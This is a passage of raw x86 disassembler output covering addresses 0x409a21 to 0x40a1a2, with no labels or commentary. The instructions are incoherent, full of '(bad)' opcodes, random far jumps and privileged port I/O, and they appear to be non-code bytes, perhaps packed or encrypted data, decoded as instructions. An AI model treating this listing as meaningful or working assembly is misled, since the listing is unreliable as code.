  409a21:	sub    eax,0xf7c75551
  409a26:	and    ch,bl
  409a28:	sub    al,0xc1
  409a2a:	lods   eax,DWORD PTR ds:[esi]
  409a2b:	jmp    0x56fe:0xc4b8fa52
  409a32:	dec    ebx
  409a33:	push   ebx
  409a34:	ret    
  409a35:	outs   dx,BYTE PTR ds:[esi]
  409a36:	cmp    ecx,DWORD PTR [ecx]
  409a38:	sub    eax,esp
  409a3a:	call   0x4dcc:0x2c2026af
  409a41:	or     esi,DWORD PTR [ebp-0x2622d007]
  409a47:	push   edx
  409a48:	inc    eax
  409a49:	lods   eax,DWORD PTR ds:[esi]
  409a4a:	(bad)  
  409a4b:	or     dh,BYTE PTR [ebx+0x32]
  409a4e:	jns    0x409aca
  409a50:	add    BYTE PTR ds:0xf99c58dd,dl
  409a56:	lock jno 0x4099f1
  409a59:	clc    
  409a5a:	int3   
  409a5b:	cmp    esp,ebx
  409a5d:	inc    edi
  409a5e:	jmp    0x409ac3
  409a60:	mov    esp,DWORD PTR [edx]
  409a62:	cmp    al,0xcf
  409a64:	or     BYTE PTR [ecx-0x41e5831c],cl
  409a6a:	repz mov esp,0xebbe82de
  409a70:	lock add dh,BYTE PTR [ebp+0x74c83a7a]
  409a77:	cs stos DWORD PTR es:[edi],eax
  409a79:	mov    ebp,0x35773d3d
  409a7e:	(bad)  
  409a7f:	gs mov bh,0x82
  409a82:	dec    esp
  409a83:	mov    ds:0x214ac557,eax
  409a88:	ret    0xf9ac
  409a8b:	mov    ch,0xa8
  409a8d:	pop    edx
  409a8e:	test   DWORD PTR [ebx-0x35a9d0f7],ebp
  409a94:	stc    
  409a95:	fild   WORD PTR [ecx+0x4e136473]
  409a9b:	jmp    0xfd39:0xd8fd37de
  409aa2:	ret    
  409aa3:	mov    bh,0xcc
  409aa5:	inc    ebx
  409aa6:	es pop eax
  409aa8:	sahf   
  409aa9:	or     ebp,DWORD PTR [eax]
  409aab:	call   0x8a9de31d
  409ab0:	popa   
  409ab1:	sbb    ebp,DWORD PTR [ebp-0x35]
  409ab4:	lods   eax,DWORD PTR ds:[esi]
  409ab5:	push   edi
  409ab6:	xchg   ebx,eax
  409ab7:	mov    dh,0x7d
  409ab9:	paddw  mm0,QWORD PTR [edi]
  409abc:	jle    0x409a86
  409abe:	fistp  WORD PTR [eax+0x655bc6c4]
  409ac4:	and    esi,DWORD PTR [eax]
  409ac6:	loope  0x409a54
  409ac8:	outs   dx,DWORD PTR ds:[esi]
  409ac9:	cmp    eax,0x4265e39f
  409ace:	aad    0x2b
  409ad0:	dec    ecx
  409ad1:	dec    eax
  409ad2:	dec    ecx
  409ad3:	out    dx,eax
  409ad4:	push   0x4b90ccf9
  409ad9:	loope  0x409b29
  409adb:	sbb    ebx,DWORD PTR [ecx+0x7b]
  409ade:	mov    bl,0x40
  409ae0:	out    dx,al
  409ae1:	les    ecx,FWORD PTR [esi+0x395e2055]
  409ae7:	push   0xe729e828
  409aec:	pop    esp
  409aed:	add    dh,BYTE PTR [ecx+edx*4+0xf39856f]
  409af4:	mov    cl,0x5b
  409af6:	jno    0x409a96
  409af8:	icebp  
  409af9:	adc    al,0xb0
  409afb:	stos   BYTE PTR es:[edi],al
  409afc:	sbb    edi,0x65
  409aff:	jmp    0x409b10
  409b01:	enter  0x8f79,0xfa
  409b05:	pop    esi
  409b06:	lods   eax,DWORD PTR ds:[esi]
  409b07:	mov    ebp,0x113ff9c9
  409b0c:	mov    ds:0x9b4f641a,eax
  409b11:	add    eax,0x9558d77e
  409b16:	nop
  409b17:	repnz fst DWORD PTR [ebp+0x6ca69264]
  409b1e:	mov    DWORD PTR [esi+0x25],esp
  409b21:	(bad)  
  409b22:	dec    esp
  409b23:	and    BYTE PTR [ecx-0x4993e0a9],0xfe
  409b2a:	(bad)  
  409b2b:	cmp    al,0x1f
  409b2d:	gs test al,0x8f
  409b30:	add    edx,DWORD PTR [eax]
  409b32:	add    ch,bl
  409b34:	xchg   ebx,eax
  409b35:	scas   al,BYTE PTR es:[edi]
  409b36:	push   ebp
  409b37:	fidiv  DWORD PTR es:0x3660ef29
  409b3e:	jo     0x409aca
  409b40:	sub    eax,0x321380e3
  409b45:	mov    al,0xd2
  409b47:	sti    
  409b48:	xor    dh,BYTE PTR [ebp+0x78]
  409b4b:	adc    eax,DWORD PTR [ecx-0x4bfa9ddc]
  409b51:	repnz inc eax
  409b53:	ss aas 
  409b55:	jecxz  0x409b43
  409b57:	xor    esp,ebp
  409b59:	pop    esi
  409b5a:	mov    edx,esi
  409b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5d:	xchg   ebx,eax
  409b5e:	cs pop ecx
  409b60:	jl     0x409b62
  409b62:	ret    0xbdb1
  409b65:	not    DWORD PTR [ecx+0xf]
  409b68:	xor    eax,0xb38dbc6a
  409b6d:	punpcklbw mm0,DWORD PTR [edx]
  409b70:	es cwde 
  409b72:	pop    ecx
  409b73:	adc    eax,0x5c7b7a19
  409b78:	cwde   
  409b79:	pop    ebp
  409b7a:	cmp    ebx,DWORD PTR [esi-0x68]
  409b7d:	jge    0x409b9c
  409b7f:	in     eax,dx
  409b80:	jge    0x409b93
  409b82:	out    0xf3,al
  409b84:	ds int3 
  409b86:	or     cl,BYTE PTR [edi-0x25]
  409b89:	call   0x7259:0x32495902
  409b90:	clc    
  409b91:	xchg   ecx,eax
  409b92:	jl     0x409b2e
  409b94:	mov    cl,BYTE PTR [ebx+0x67]
  409b97:	mov    ebp,0xe47cb765
  409b9c:	dec    esp
  409b9d:	cdq    
  409b9e:	cmc    
  409b9f:	add    ch,BYTE PTR [esi+0x5a]
  409ba2:	or     eax,DWORD PTR [ebx+0x49004818]
  409ba8:	cmp    ah,ah
  409baa:	gs loop 0x409b51
  409bad:	not    BYTE PTR [eax]
  409baf:	ins    DWORD PTR es:[edi],dx
  409bb0:	dec    ebx
  409bb1:	dec    eax
  409bb2:	xor    esi,DWORD PTR [esi-0x68b28440]
  409bb8:	outs   dx,DWORD PTR ds:[esi]
  409bb9:	push   edi
  409bba:	pushf  
  409bbb:	popf   
  409bbc:	cdq    
  409bbd:	aaa    
  409bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bbf:	inc    edi
  409bc0:	mov    ah,0x45
  409bc2:	dec    edi
  409bc3:	in     al,0xe7
  409bc5:	rcr    DWORD PTR [ebp-0x5e],cl
  409bc8:	lock loopne 0x409b92
  409bcb:	sar    BYTE PTR [esi-0xcc92307],cl
  409bd1:	outs   dx,BYTE PTR ds:[esi]
  409bd2:	inc    edi
  409bd3:	std    
  409bd4:	adc    bl,dh
  409bd6:	mov    dh,0x2
  409bd8:	dec    edx
  409bd9:	dec    ebx
  409bda:	ss push es
  409bdc:	and    al,0xc6
  409bde:	and    edi,ecx
  409be0:	(bad)  
  409be1:	lods   eax,DWORD PTR ds:[esi]
  409be2:	out    0x4,eax
  409be4:	ror    DWORD PTR [edi-0x6b],1
  409be7:	stos   BYTE PTR es:[edi],al
  409be8:	dec    esp
  409be9:	pop    edi
  409bea:	mov    ah,dh
  409bec:	mov    al,0x55
  409bee:	xchg   ecx,eax
  409bef:	push   cs
  409bf0:	xchg   ecx,eax
  409bf1:	jo     0x409bc6
  409bf3:	es test edi,eax
  409bf6:	cmp    bl,ah
  409bf8:	test   BYTE PTR ds:0x1caeea95,0xe
  409bff:	jecxz  0x409c11
  409c01:	sub    ch,BYTE PTR [edx+0x7b]
  409c04:	and    DWORD PTR [esi],esp
  409c06:	je     0x409bc7
  409c08:	cmp    bh,bl
  409c0a:	ds in  al,dx
  409c0c:	cld    
  409c0d:	adc    ecx,DWORD PTR [ebx-0x296cf8ee]
  409c13:	(bad)  
  409c14:	sahf   
  409c15:	fsub   QWORD PTR [edx+0x3e419818]
  409c1b:	ins    BYTE PTR es:[edi],dx
  409c1c:	mov    cl,0x56
  409c1e:	push   ebp
  409c1f:	in     eax,0xd0
  409c21:	jecxz  0x409c2e
  409c23:	jo     0x409c55
  409c25:	cmp    DWORD PTR [ecx-0x1de7fa23],esp
  409c2b:	pop    ss
  409c2c:	out    dx,eax
  409c2d:	pop    ebx
  409c2e:	popf   
  409c2f:	std    
  409c30:	outs   dx,DWORD PTR ds:[esi]
  409c31:	sbb    DWORD PTR [edi-0x209a46de],edx
  409c37:	stos   DWORD PTR es:[edi],eax
  409c38:	cdq    
  409c39:	out    dx,al
  409c3a:	inc    esi
  409c3b:	push   esi
  409c3c:	fistp  WORD PTR [edi+0x76]
  409c3f:	shl    edx,cl
  409c41:	pushf  
  409c42:	and    ebx,ebp
  409c44:	ins    DWORD PTR es:[edi],dx
  409c45:	cwde   
  409c46:	jnp    0x409c4a
  409c48:	jp     0x409c7c
  409c4a:	pop    edi
  409c4b:	inc    edx
  409c4c:	fisttp WORD PTR [edi]
  409c4f:	inc    ebp
  409c50:	test   ch,bl
  409c52:	push   es
  409c53:	mov    dl,0x67
  409c55:	jmp    0x409be8
  409c57:	iret   
  409c58:	fdivr  DWORD PTR ds:0xa1a58a54
  409c5e:	cdq    
  409c5f:	ror    WORD PTR [ebp+0x10],0x18
  409c64:	lock int 0xdf
  409c67:	cld    
  409c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c69:	rol    BYTE PTR [esi-0x580714c4],0x84
  409c70:	shl    BYTE PTR [ecx-0x78],1
  409c73:	(bad)  
  409c74:	adc    eax,0x3a77a0b2
  409c79:	mov    esp,0x2ef40d4a
  409c7e:	mov    ?,ebx
  409c80:	xchg   BYTE PTR [esi-0x70],bl
  409c83:	jl     0x409c92
  409c85:	cmp    ebp,ebx
  409c87:	mov    ebp,0xfe241a83
  409c8c:	mov    dh,0xbb
  409c8e:	mov    bl,ah
  409c90:	dec    edx
  409c91:	xor    eax,0xea445f45
  409c96:	lock ret 0x44d8
  409c9a:	aam    0x28
  409c9c:	mov    dh,0x4d
  409c9e:	and    cl,ah
  409ca0:	mov    esp,0x79d917a9
  409ca5:	mov    ecx,0x8c877cd1
  409caa:	in     eax,dx
  409cab:	test   eax,0x356bc69c
  409cb0:	xchg   ebp,eax
  409cb1:	push   ebx
  409cb2:	call   0x155f001b
  409cb7:	jg     0x409c7f
  409cb9:	mov    ch,0x3f
  409cbb:	jo     0x409c7f
  409cbd:	sar    al,cl
  409cbf:	mov    ebp,0xb66d2d49
  409cc4:	or     dh,bl
  409cc6:	(bad)  
  409cc7:	pop    ds
  409cc8:	dec    esi
  409cc9:	scas   al,BYTE PTR es:[edi]
  409cca:	xchg   ecx,eax
  409ccb:	jo     0x409ca2
  409ccd:	sti    
  409cce:	out    0x1c,al
  409cd0:	js     0x409cca
  409cd2:	and    BYTE PTR [ebp+eax*1-0x24],dh
  409cd6:	sub    ebx,0xb0e1ffbc
  409cdc:	pop    eax
  409cdd:	pop    edx
  409cde:	dec    edx
  409cdf:	rcr    DWORD PTR [eax-0x7c],1
  409ce2:	jne    0x409d22
  409ce4:	retf   0xb796
  409ce7:	pop    ebx
  409ce8:	mov    edx,0x95b3f6e0
  409ced:	cwde   
  409cee:	stc    
  409cef:	sbb    al,0xbd
  409cf1:	jl     0x409cc1
  409cf3:	dec    edi
  409cf4:	pop    es
  409cf5:	xor    eax,0x828ade5
  409cfa:	inc    ebx
  409cfb:	push   0x27
  409cfd:	pop    edx
  409cfe:	mov    ebp,0xb193b48f
  409d03:	(bad)  
  409d04:	scas   al,BYTE PTR es:[edi]
  409d05:	lldt   bx
  409d08:	fmul   QWORD PTR [esi-0x7d72501]
  409d0e:	add    al,0xce
  409d10:	and    BYTE PTR [edi+eiz*8],ah
  409d13:	jecxz  0x409caf
  409d15:	fisub  WORD PTR [edi+0x13180f99]
  409d1b:	sub    ah,dl
  409d1d:	sbb    DWORD PTR [ebx-0x1ce008d0],0x50ac4761
  409d27:	xchg   esp,eax
  409d28:	lds    edi,FWORD PTR [esi]
  409d2a:	xchg   edi,eax
  409d2b:	test   al,0xef
  409d2d:	mov    dl,0x5b
  409d2f:	sub    bl,BYTE PTR [ebx]
  409d31:	sbb    eax,0xe0a12c52
  409d36:	cmp    cl,al
  409d38:	mov    ds:0xa5c3577f,al
  409d3d:	or     al,0x52
  409d3f:	jg     0x409d45
  409d41:	or     esp,DWORD PTR [ebx]
  409d43:	or     DWORD PTR [ebp+0x73],0xffffffeb
  409d47:	dec    ebx
  409d48:	int    0x33
  409d4a:	mov    dl,0x2c
  409d4c:	aam    0x14
  409d4e:	push   edx
  409d4f:	enter  0x5e86,0x5a
  409d53:	test   DWORD PTR [ebp-0x27],ebx
  409d56:	pop    ss
  409d57:	add    DWORD PTR [eax],ebx
  409d59:	sbb    al,0x6a
  409d5b:	mov    ah,0xc6
  409d5d:	add    eax,0x23b884dd
  409d62:	push   edi
  409d63:	and    esp,DWORD PTR [ecx+0x198befa5]
  409d69:	pop    edi
  409d6a:	leave  
  409d6b:	jl     0x409cfa
  409d6d:	imul   ecx,DWORD PTR [ebx+eiz*2-0x7f08e6a7],0xba6048af
  409d78:	jo     0x409dae
  409d7a:	push   ebp
  409d7b:	push   cs
  409d7c:	add    al,0x61
  409d7e:	mov    ch,0x43
  409d80:	aam    0x9
  409d82:	mov    eax,0xf24cf39a
  409d87:	aad    0x23
  409d89:	push   ss
  409d8a:	xor    dl,dh
  409d8c:	mov    ebp,0xac4f7c01
  409d91:	mov    cl,0x30
  409d93:	dec    edi
  409d94:	loop   0x409ddd
  409d96:	pop    edi
  409d97:	test   al,0xe7
  409d99:	jmp    0xe0609d03
  409d9e:	sbb    edx,DWORD PTR [ecx-0x1]
  409da1:	fcmovbe st,st(0)
  409da3:	mov    DWORD PTR [edx+0x11],edi
  409da6:	or     al,BYTE PTR [edi+0x6c]
  409da9:	lods   eax,DWORD PTR ds:[esi]
  409daa:	xlat   BYTE PTR ds:[ebx]
  409dab:	jmp    0x409d98
  409dad:	aam    0xc3
  409daf:	pop    ss
  409db0:	mov    eax,0x71074a9c
  409db5:	mov    ebx,0xbd8ebefb
  409dba:	mov    WORD PTR [edx+0x7f],?
  409dbd:	(bad)  [edi+0x2e]
  409dc0:	lea    ecx,[ebp+0x44869d86]
  409dc6:	iret   
  409dc7:	ja     0x409ddb
  409dc9:	sbb    ah,BYTE PTR [esi+esi*8+0x4e184dca]
  409dd0:	daa    
  409dd1:	sub    eax,0x2accccb5
  409dd6:	adc    eax,0x699b91be
  409ddb:	sub    ch,cl
  409ddd:	dec    esp
  409dde:	push   eax
  409ddf:	(bad)  
  409de0:	stos   BYTE PTR es:[edi],al
  409de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409de2:	push   ss
  409de3:	xchg   ecx,eax
  409de4:	test   BYTE PTR [ecx],ah
  409de6:	mov    dh,0x24
  409de8:	cld    
  409de9:	sub    eax,0xcda2c69e
  409dee:	fistp  DWORD PTR [ecx+0x6b]
  409df1:	(bad)  
  409df2:	pushf  
  409df3:	rcr    BYTE PTR ds:0xc3abd516,cl
  409df9:	add    ecx,DWORD PTR [eax+0x53]
  409dfc:	outs   dx,DWORD PTR ds:[esi]
  409dfd:	sti    
  409dfe:	rcl    DWORD PTR [esi+0x50],cl
  409e01:	out    dx,al
  409e02:	adc    ebp,DWORD PTR [edx]
  409e04:	sub    BYTE PTR [ecx],ah
  409e06:	push   eax
  409e07:	fsubr  DWORD PTR [edi]
  409e09:	add    DWORD PTR [ebp-0x1a30190b],esi
  409e0f:	es retf 
  409e11:	shl    DWORD PTR [edi],0x50
  409e14:	xor    DWORD PTR [edi],0x43
  409e17:	gs gs dec ecx
  409e1a:	push   edi
  409e1b:	in     al,0x45
  409e1d:	add    dl,dh
  409e1f:	gs push 0x8485cc09
  409e25:	push   esp
  409e26:	pop    eax
  409e27:	out    0xe0,al
  409e29:	jecxz  0x409e0c
  409e2b:	ret    
  409e2c:	dec    ecx
  409e2d:	cmp    edi,DWORD PTR [esi+0x17]
  409e30:	or     ebx,esp
  409e32:	add    dl,BYTE PTR [esi+0x64]
  409e35:	sub    ah,ah
  409e37:	cmp    al,0x60
  409e39:	sbb    eax,0x3d7c0e4a
  409e3e:	lods   eax,DWORD PTR fs:[esi]
  409e40:	sub    bh,BYTE PTR [ebx-0x13]
  409e43:	jl     0x409dd7
  409e45:	pushf  
  409e46:	iret   
  409e47:	(bad)  
  409e48:	inc    DWORD PTR [ebx-0x46]
  409e4b:	pop    ebp
  409e4c:	mov    edx,0x36603c39
  409e51:	pop    ecx
  409e52:	add    ah,dl
  409e54:	aaa    
  409e55:	test   eax,0x71fd08ce
  409e5a:	dec    eax
  409e5b:	inc    ecx
  409e5c:	xchg   ebx,eax
  409e5d:	mov    bl,0x82
  409e5f:	gs dec ebx
  409e61:	(bad)  
  409e63:	jbe    0x409de6
  409e65:	mov    bl,0x78
  409e67:	inc    ebx
  409e68:	push   ecx
  409e69:	adc    al,0x20
  409e6b:	add    DWORD PTR [edx-0x21],eax
  409e6e:	mov    edx,DWORD PTR [esp+edi*4+0x66]
  409e72:	out    0xba,eax
  409e74:	aam    0xd3
  409e76:	inc    ebp
  409e77:	fdivrp st(4),st
  409e79:	lods   al,BYTE PTR ds:[esi]
  409e7a:	jp     0x409e33
  409e7c:	inc    esi
  409e7d:	pusha  
  409e7e:	sbb    cl,ch
  409e80:	shl    DWORD PTR [edx],cl
  409e82:	aad    0x90
  409e84:	pop    ss
  409e85:	(bad)  
  409e87:	add    cl,bh
  409e89:	ret    
  409e8a:	add    al,0x1f
  409e8c:	mov    WORD PTR [edi+0x1b4d1750],ss
  409e92:	jb     0x409e4b
  409e94:	mov    dh,0x77
  409e96:	pop    ss
  409e97:	xor    BYTE PTR [edx+0x46],0x69
  409e9b:	push   esp
  409e9c:	or     ah,BYTE PTR [esi-0x78ef1de7]
  409ea2:	dec    eax
  409ea3:	call   0x9b85:0xddbf0462
  409eaa:	mov    ecx,DWORD PTR [edx+0x4c]
  409ead:	popf   
  409eae:	rcl    DWORD PTR [edx+edx*1],0x62
  409eb2:	cmp    DWORD PTR [ecx+0x4c9d4d5b],ebp
  409eb8:	sbb    eax,esp
  409eba:	pop    es
  409ebb:	bound  esp,QWORD PTR [edi+0x22]
  409ebe:	fdiv   QWORD PTR [ebp-0x566bc44]
  409ec4:	mov    cl,0x6f
  409ec6:	sub    BYTE PTR [eax-0x61],al
  409ec9:	test   al,0x94
  409ecb:	adc    eax,0x72d4a102
  409ed0:	pop    ebx
  409ed1:	ja     0x409ecb
  409ed3:	jne    0x409ec8
  409ed5:	push   esi
  409ed6:	push   es
  409ed7:	gs push 0xa87416a6
  409edd:	pop    ebp
  409ede:	inc    esp
  409edf:	pop    eax
  409ee0:	xchg   DWORD PTR [ebp+edx*8-0x79],ecx
  409ee4:	mov    ah,0x8a
  409ee6:	clc    
  409ee7:	popf   
  409ee8:	aaa    
  409ee9:	and    DWORD PTR ds:0xbb5bca2b,esi
  409eef:	in     eax,0x7b
  409ef1:	stos   BYTE PTR es:[edi],al
  409ef2:	(bad)  
  409ef4:	mov    eax,0x648b7675
  409ef9:	mov    bl,0x97
  409efb:	shl    BYTE PTR [eax-0x4d705ee7],0xe6
  409f02:	in     al,0xf5
  409f04:	ret    0xb104
  409f07:	xor    bl,al
  409f09:	in     al,dx
  409f0a:	popf   
  409f0b:	jp     0x409f60
  409f0d:	add    ebp,DWORD PTR [ecx+0x35]
  409f10:	arpl   bx,ax
  409f12:	mov    esi,0x27f871ce
  409f17:	add    eax,0x7c119e1f
  409f1c:	out    dx,al
  409f1d:	cmp    BYTE PTR [ecx+edi*1],ah
  409f20:	into   
  409f21:	in     al,dx
  409f22:	dec    ebp
  409f23:	out    dx,eax
  409f24:	enter  0xe3cd,0x26
  409f28:	jp     0x409f4c
  409f2a:	test   eax,0x98203121
  409f2f:	ss jb  0x409ec8
  409f32:	xchg   esp,eax
  409f33:	lods   eax,DWORD PTR ds:[esi]
  409f34:	mov    esp,0x69ca12fb
  409f39:	pop    ecx
  409f3a:	and    BYTE PTR [ebp+0x7570966f],dh
  409f40:	repz push es
  409f42:	nop
  409f43:	popa   
  409f44:	mov    dl,0xde
  409f46:	leave  
  409f47:	out    dx,eax
  409f48:	in     eax,dx
  409f49:	xchg   edi,eax
  409f4a:	sub    al,0x3c
  409f4c:	push   esp
  409f4d:	retf   0x28d2
  409f50:	and    BYTE PTR [edx+0x7e7486f6],cl
  409f56:	aaa    
  409f57:	push   ecx
  409f58:	das    
  409f59:	bound  edx,QWORD PTR [ecx-0x19]
  409f5c:	jp     0x409eff
  409f5e:	cmp    dh,BYTE PTR [edx+0x55]
  409f61:	pop    ss
  409f62:	mov    DWORD PTR [esi],0x5de8afdb
  409f68:	iret   
  409f69:	popa   
  409f6a:	push   esp
  409f6b:	sub    edi,DWORD PTR [eax]
  409f6d:	push   ebp
  409f6e:	repz loope 0x409fa1
  409f71:	icebp  
  409f72:	(bad)  
  409f73:	sub    eax,0xfeacad2c
  409f78:	enter  0x63c3,0xdc
  409f7c:	(bad)  
  409f7d:	xor    al,0xa5
  409f7f:	mov    eax,0xfb05295e
  409f84:	xchg   ebx,eax
  409f85:	sbb    eax,0x467c0fb2
  409f8a:	mov    ecx,0x6c4cfd79
  409f8f:	jns    0x409f5b
  409f91:	adc    dl,BYTE PTR [ecx+0x225b8824]
  409f97:	xchg   edi,eax
  409f98:	and    DWORD PTR [ecx+0x3d75d275],0xa06dd386
  409fa2:	and    edx,DWORD PTR [ecx]
  409fa4:	jmp    0x88f5396d
  409fa9:	xchg   esp,eax
  409faa:	jg     0x409f6e
  409fac:	(bad)  
  409fae:	mov    bh,0x34
  409fb0:	pop    ebx
  409fb1:	inc    esi
  409fb2:	add    al,0x6e
  409fb4:	cwde   
  409fb5:	ficomp DWORD PTR [ebx+0x1f]
  409fb8:	inc    ecx
  409fb9:	int    0xb7
  409fbb:	iret   
  409fbc:	push   ds
  409fbd:	nop
  409fbe:	mov    edx,0x6bb9f96
  409fc3:	adc    bh,BYTE PTR [edx]
  409fc5:	inc    ecx
  409fc6:	(bad)  
  409fc7:	or     DWORD PTR [edi-0x60],edi
  409fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fcb:	pop    ds
  409fcc:	call   0x6e9b:0x6ce25d9e
  409fd3:	retf   
  409fd4:	cwde   
  409fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd6:	inc    esp
  409fd7:	push   0xffffff9a
  409fd9:	jp     0x409fae
  409fdb:	ins    DWORD PTR es:[edi],dx
  409fdc:	xlat   BYTE PTR ds:[ebx]
  409fdd:	loope  0x409f91
  409fdf:	mov    ah,0xd8
  409fe1:	adc    al,0x6a
  409fe3:	loope  0x40a04c
  409fe5:	sub    eax,0x1f1c0fe5
  409fea:	sub    ah,BYTE PTR [esp+esi*4-0x40]
  409fee:	cdq    
  409fef:	add    ebx,DWORD PTR [edi]
  409ff1:	scas   al,BYTE PTR es:[edi]
  409ff2:	lock pushf 
  409ff4:	pop    esi
  409ff5:	inc    edi
  409ff6:	aaa    
  409ff7:	pop    ds
  409ff8:	ror    DWORD PTR [edx],1
  409ffa:	(bad)  
  409ffb:	fld    TBYTE PTR [esi+0x207f3df7]
  40a001:	inc    edx
  40a002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a003:	push   edx
  40a004:	mov    edx,0xdc79a704
  40a009:	cwde   
  40a00a:	dec    ecx
  40a00b:	cmp    eax,edi
  40a00d:	adc    eax,ebx
  40a00f:	in     eax,dx
  40a010:	aad    0x25
  40a012:	push   edx
  40a013:	pop    edi
  40a014:	sub    cl,dh
  40a016:	sbb    DWORD PTR [ebx+0x7756efef],edx
  40a01c:	add    al,0xeb
  40a01e:	mov    eax,ds:0x34c5cc9b
  40a023:	ins    DWORD PTR es:[edi],dx
  40a024:	mov    edi,0x2411508f
  40a029:	(bad)  
  40a02a:	adc    eax,DWORD PTR [eax+0x3b371eee]
  40a030:	add    al,0x69
  40a032:	cwde   
  40a033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a034:	aas    
  40a035:	clc    
  40a036:	in     al,dx
  40a037:	mov    ds:0xeb369df1,al
  40a03c:	outs   dx,BYTE PTR ds:[esi]
  40a03d:	in     al,0x26
  40a03f:	inc    ecx
  40a040:	sbb    DWORD PTR [ebp+0x263a7923],ebp
  40a046:	pop    ebx
  40a047:	sub    eax,DWORD PTR [ebx+0x1f]
  40a04a:	dec    ebp
  40a04b:	inc    edi
  40a04c:	fwait
  40a04d:	pop    edi
  40a04e:	pop    esp
  40a04f:	test   DWORD PTR [ebp+0x3a],0xaa4ad4dc
  40a056:	jo     0x409fec
  40a058:	sbb    ch,BYTE PTR [ebx-0x73716d4d]
  40a05e:	in     al,dx
  40a05f:	add    BYTE PTR [edi-0x4cac81fe],ah
  40a065:	mov    DWORD PTR [edx+0x47],eax
  40a068:	push   0xa4886329
  40a06d:	inc    ecx
  40a06e:	lea    esi,[eax+0x1418049a]
  40a074:	xor    esp,esp
  40a076:	popa   
  40a077:	cmp    DWORD PTR [ebx-0x45e5c053],esp
  40a07d:	pusha  
  40a07e:	push   DWORD PTR [edx-0x5d]
  40a081:	ss jmp 0x40a046
  40a084:	(bad)  
  40a085:	mov    ebx,0x935545a8
  40a08a:	(bad)  
  40a08c:	push   eax
  40a08d:	adc    eax,0x8de1f980
  40a092:	sbb    al,0xb
  40a094:	add    ebp,DWORD PTR ds:0xa8ee95dc
  40a09a:	jnp    0x40a0d3
  40a09c:	pop    ebx
  40a09d:	adc    dl,BYTE PTR [edi-0x4c]
  40a0a0:	push   esi
  40a0a1:	loopne 0x40a0f2
  40a0a3:	out    0x9,al
  40a0a5:	ror    DWORD PTR [ebp+eiz*4+0x6d],cl
  40a0a9:	jnp    0x40a087
  40a0ab:	jbe    0x40a09d
  40a0ad:	cli    
  40a0ae:	data16 mov ch,0xe2
  40a0b1:	mov    eax,0x70134006
  40a0b6:	inc    eax
  40a0b7:	cdq    
  40a0b8:	xor    eax,0x56159cc3
  40a0bd:	ins    DWORD PTR es:[edi],dx
  40a0be:	fs sti 
  40a0c0:	inc    ebp
  40a0c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0c2:	inc    esi
  40a0c3:	call   DWORD PTR [esi]
  40a0c5:	dec    eax
  40a0c6:	inc    esi
  40a0c7:	gs pusha 
  40a0c9:	sbb    cl,BYTE PTR ss:[esi+0xc3d3fb]
  40a0d0:	nop
  40a0d1:	sub    DWORD PTR [ebp-0x52],ebx
  40a0d4:	aam    0xaa
  40a0d6:	push   edx
  40a0d7:	jb     0x40a123
  40a0d9:	or     al,0xfa
  40a0db:	sbb    al,0x49
  40a0dd:	or     eax,0x7300690c
  40a0e2:	mov    BYTE PTR [ebx],cl
  40a0e4:	jg     0x40a12a
  40a0e6:	jb     0x40a129
  40a0e8:	push   ds
  40a0e9:	cmp    ebp,0xfffffff8
  40a0ec:	sbb    eax,0xb52d108
  40a0f1:	das    
  40a0f2:	push   esp
  40a0f3:	in     eax,0x4a
  40a0f5:	and    eax,0x3dc1ec41
  40a0fa:	mov    edi,0xed524366
  40a0ff:	inc    edx
  40a100:	add    ah,BYTE PTR [edi]
  40a102:	pop    edx
  40a103:	add    ebx,DWORD PTR [esi+0x2f7dbe3]
  40a109:	outs   dx,DWORD PTR ds:[esi]
  40a10a:	outs   dx,BYTE PTR ds:[esi]
  40a10b:	push   ecx
  40a10c:	cwde   
  40a10d:	(bad)  
  40a10e:	hlt    
  40a10f:	sub    BYTE PTR [edx-0x4f537be4],dh
  40a115:	pop    ebp
  40a116:	shl    BYTE PTR [eax+ebp*1+0x5ee8cfa],1
  40a11d:	rcr    DWORD PTR [ecx],1
  40a11f:	sub    ebp,ebx
  40a121:	mov    eax,0x4a635384
  40a126:	cmp    BYTE PTR [edi+0x37],ah
  40a129:	mov    ah,0x3d
  40a12b:	add    eax,0x9bcc0622
  40a130:	imul   BYTE PTR [esi]
  40a132:	fwait
  40a133:	imul   edi,DWORD PTR [eax-0x5d],0xffffffb1
  40a137:	stos   DWORD PTR es:[edi],eax
  40a138:	cmp    esi,eax
  40a13a:	adc    eax,0x18f54d85
  40a13f:	xchg   edi,eax
  40a140:	inc    edi
  40a141:	test   al,0x4d
  40a143:	ins    BYTE PTR es:[edi],dx
  40a144:	and    DWORD PTR [esi-0x1e],0x400b2a91
  40a14b:	les    ebx,FWORD PTR [ecx]
  40a14d:	sub    DWORD PTR [edi],ecx
  40a14f:	xor    al,0xfc
  40a151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a152:	call   0xee9b:0xa3962ce0
  40a159:	test   DWORD PTR [esi+0x6e30210],esp
  40a15f:	lds    esi,FWORD PTR [eax]
  40a161:	jo     0x40a18a
  40a163:	adc    ebp,DWORD PTR [ebx]
  40a165:	call   0x7380f483
  40a16a:	sub    al,0x2f
  40a16c:	ins    DWORD PTR es:[edi],dx
  40a16d:	mov    cl,0xd6
  40a16f:	add    edx,eax
  40a171:	(bad)  
  40a172:	hlt    
  40a173:	xor    eax,0x7000e423
  40a178:	js     0x40a125
  40a17a:	sbb    al,0xc1
  40a17c:	mov    eax,0xea531a1d
  40a181:	mov    BYTE PTR [edx+0x5390b979],ah
  40a187:	push   0x282b86a1
  40a18c:	push   es
  40a18d:	imul   esp,DWORD PTR [eax+0x10],0xffffffa9
  40a191:	xlat   BYTE PTR ds:[ebx]
  40a192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a193:	retf   0x73ef
  40a196:	outs   dx,DWORD PTR ds:[esi]
  40a197:	sbb    eax,0xc96f63f7
  40a19c:	retf   0xca17
  40a19f:	dec    edi
  40a1a0:	retf   
  40a1a1:	popa   
  40a1a2:	lock call 0xb1cd773a
